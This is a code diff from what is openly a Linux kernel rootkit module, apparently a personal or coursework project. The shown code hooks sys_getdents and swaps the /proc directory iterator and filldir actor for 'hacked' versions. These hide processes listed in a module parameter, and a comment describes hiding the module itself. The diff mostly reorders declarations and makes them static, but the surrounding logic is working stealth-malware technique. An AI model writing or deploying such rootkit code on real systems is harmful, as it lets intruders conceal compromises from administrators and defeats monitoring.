@@ -326,16 +326,18 @@ asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, uns
 
 //START CARLOS
 //iterate takes pointer to dir_context	
-struct list_head *module_list;//reference to module_list. Used to hide mod from insmod
+
+
+
+static struct inode *proc_inode;//node in proc
+static struct file_operations *backup_proc_fops;//er to restore orginal struct 
+static struct list_head *module_list;//reference to module_list. Used to hide mod from insmod
+static struct path p;
+static struct file_operations proc_fops;//pointers to listing contents in proc dir
+static struct dir_context *backup_ctx;
 int count;
 static char* rkps[10];
 module_param_array(rkps, charp, &count, 0);
-static struct file_operations proc_fops;//pointers to listing contents in proc dir
-static struct file_operations *backup_proc_fops;//keep backup in order to restore orginal struct 
-static struct inode *proc_inode;//node in proc
-static struct path p;
-struct dir_context *backup_ctx;
- 
 static int overwritten_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type){
     //prints contents 
     int i;
@@ -345,12 +347,12 @@ static int overwritten_filldir_t(struct dir_context *ctx, const char *proc_name,
     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);//return orginal pointer to  dir_context.Prints it off.
 }
 
-struct dir_context hacked_ctx = {
+static struct dir_context hacked_ctx = {
     .actor = overwritten_filldir_t,//Evil struct
 };
 
 //getdents() calls iterate_dir() which calls iterate_shared()
-int overwritten_iterate_shared(struct file *file, struct dir_context *ctx){
+static int overwritten_iterate_shared(struct file *file, struct dir_context *ctx){
     printk(KERN_INFO "@$@!: rk_iterate_shared"); 
     int result = 0;
     hacked_ctx.pos = ctx->pos;
